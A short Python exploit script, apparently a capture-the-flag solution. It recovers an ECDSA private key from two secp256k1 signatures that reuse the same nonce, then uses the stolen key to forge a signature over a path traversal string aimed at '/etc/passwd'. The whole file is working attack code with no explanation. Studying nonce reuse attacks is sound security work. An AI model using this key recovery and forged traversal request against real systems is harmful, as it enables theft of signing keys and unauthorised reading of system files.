import ecdsa
import libnum
import hashlib
from asn1crypto import core

G = ecdsa.SECP256k1.generator
order = G.order()

#Information of 1st signature
msg1 = "example.txt"
h1 = int(hashlib.sha256(msg1.encode()).hexdigest(),base=16)
hexsig1 = "304502204a5169f673aa632f538aaa128b6348536db2b637fd89073d49b6a23879cdb3ad022100ee8005734310d25a5ee93ddb8ffcc1f5774ededb72a4cc452e99b0384da8ed5e"
signature1 = core.Sequence.load(bytes.fromhex(hexsig1))
r1 = signature1[0].native
s1 = signature1[1].native


#Information of 2nd signature
msg2 = "sample.txt"
h2 = int(hashlib.sha256(msg2.encode()).hexdigest(),base=16)
hexsig2="304502204a5169f673aa632f538aaa128b6348536db2b637fd89073d49b6a23879cdb3ad022100cbdb5c5fb640cb252986459d218ee856ac09e05f3f28edbd6031d3283d3a5163"
signature2 = core.Sequence.load(bytes.fromhex(hexsig2))
r2 = signature2[0].native
s2 = signature2[1].native


#Recover static nonce
valic = libnum.invmod((s1-s2), order)
recovered_K=((h1-h2) * valic) % order
print ("\nRecovered K :=> " + str(recovered_K))


#Recover private key
recovered_priv = (libnum.invmod(r1, order) * ((s1 * recovered_K) - h1)) % order
print ("\nRecovered PrivateKey :=> " + str(recovered_priv))


#Generate signature of user data for exploit
sk = ecdsa.SigningKey.from_secret_exponent(recovered_priv, curve=ecdsa.SECP256k1)
msg="../../../../../../../etc/passwd"
hash_msg = hashlib.sha256(msg.encode('utf-8')).digest()
sig = sk.sign_digest(hash_msg, sigencode=ecdsa.util.sigencode_der, k=recovered_K)
print ("\n\n" + msg)
print ("Signature: " + sig.hex())